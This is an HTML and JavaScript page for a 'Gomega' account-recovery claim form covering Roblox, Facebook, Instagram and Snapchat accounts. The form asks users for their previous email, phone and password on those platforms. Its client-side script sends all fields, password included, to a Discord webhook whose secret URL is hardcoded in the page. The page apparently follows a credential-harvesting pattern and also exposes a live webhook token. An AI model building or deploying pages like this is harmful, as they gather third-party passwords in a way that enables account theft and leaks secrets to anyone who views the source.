<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Gomega - Submit a Claim</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="styles.css" />
  <script type="module" src="/firebase-init.js"></script>
  <style>
    body { background-color: #111; color: #fff; font-family: Arial, sans-serif; margin: 0; padding: 0; }
    .container { padding: 2rem; max-width: 600px; margin: auto; }
    h1 { text-align: center; margin-bottom: 1rem; }
    form { background: #222; padding: 1.5rem; border-radius: 8px; display: flex; flex-direction: column; gap: 1rem; }
    label { display: flex; flex-direction: column; font-size: 0.9rem; }
    select, input[type="text"], textarea, button { width: 100%; padding: 0.75rem; border-radius: 6px; border: none; font-size: 1rem; }
    textarea { resize: vertical; min-height: 80px; }
    button { background: #4fc3f7; color: #111; font-weight: bold; cursor: pointer; }
    button:hover { background: #0288d1; }
    #submitStatus { margin-top: 1rem; font-size: 0.95rem; }
    @media (max-width: 500px) { .container { padding: 1rem; } form { padding: 1rem; } }
  </style>
</head>
<body>
  <div class="container">
    <h1>üìù File a Claim</h1>
    <form id="claimForm">
      <label for="platform">Platform
        <select id="platform" required>
          <option value="">-- Select Platform --</option>
          <option value="Roblox">Roblox</option>
          <option value="Facebook">Facebook</option>
          <option value="Instagram">Instagram</option>
          <option value="Snapchat">Snapchat</option>
          <option value="Other">Other</option>
        </select>
      </label>
      <label for="accountId">Account Username/ID
        <input type="text" id="accountId" placeholder="e.g. user123" required />
      </label>
      <label for="description">Issue Description
        <textarea id="description" placeholder="Describe what happened" required></textarea>
      </label>
      <label for="previousInfo">Previous Account Info (email, phone, password)
        <input type="text" id="previousInfo" placeholder="Optional past info" />
      </label>
      <label for="attackerInfo">Attacker Info (if known)
        <input type="text" id="attackerInfo" placeholder="Optional attacker contact" />
      </label>
      <button type="submit">Submit Claim</button>
    </form>
    <div id="submitStatus"></div>
  </div>

  <script type="module">
    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.11.0/firebase-firestore.js";
    import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.11.0/firebase-auth.js";
    import { app } from "./firebase-init.js";

    const db = getFirestore(app);
    const auth = getAuth();
    const form = document.getElementById('claimForm');
    const statusDiv = document.getElementById('submitStatus');

    let currentUser = null;

    onAuthStateChanged(auth, user => {
      if (!user) {
        statusDiv.textContent = '‚ùå Please sign in to submit a claim.';
        form.style.display = 'none';
      } else {
        currentUser = user;
      }
    });

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      if (!currentUser) return;

      const data = {
        uid: currentUser.uid,
        email: currentUser.email,
        platform: form.platform.value,
        accountId: form.accountId.value,
        description: form.description.value,
        previousInfo: form.previousInfo.value || '',
        attackerInfo: form.attackerInfo.value || '',
        status: 'pending',
        timestamp: serverTimestamp()
      };

      try {
        const docRef = await addDoc(collection(db, 'claims'), data);
        const claimId = docRef.id;
        const claimUrl = `${window.location.origin}/claim.html?id=${claimId}`;
        const approveUrl = `${window.location.origin}/process.html?id=${claimId}&action=approve`;
        const rejectUrl = `${window.location.origin}/process.html?id=${claimId}&action=reject`;

        // Fire Discord webhook
        await fetch('https://discord.com/api/webhooks/1398060748093128765/HhvxXPIdCMeyqbR6bsSyCcWPSRwkRaAkJHAdhRTyfY5Hw_NZvrh6JkYRr9lr7z4PeUD3', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: 'Gomega Bot',
            embeds: [{
              title: 'üì® New Claim Submitted',
              color: 3447003,
              fields: [
                { name: 'Platform', value: data.platform, inline: true },
                { name: 'User', value: data.email, inline: true },
                { name: 'Account ID', value: data.accountId, inline: false },
                { name: 'Description', value: data.description, inline: false },
                { name: 'Previous Info', value: data.previousInfo || 'N/A', inline: false },
                { name: 'Attacker Info', value: data.attackerInfo || 'N/A', inline: false }
              ],
              timestamp: new Date().toISOString(),
              footer: { text: `Claim ID: ${claimId}` }
            }],
            components: [{
              type: 1,
              components: [
                { type: 2, style: 3, label: '‚úÖ Approve', url: approveUrl },
                { type: 2, style: 4, label: '‚ùå Reject', url: rejectUrl }
              ]
            }]
          })
        });

        statusDiv.innerHTML = `‚úÖ Submitted! You may <a href="${claimUrl}" style="color:#4fc3f7">view your claim</a>.`;
        form.reset();
      } catch (err) {
        console.error('Submission error:', err);
        statusDiv.textContent = '‚ùå Failed to submit. Try again later.';
      }
    });
  </script>
</body>
</html>
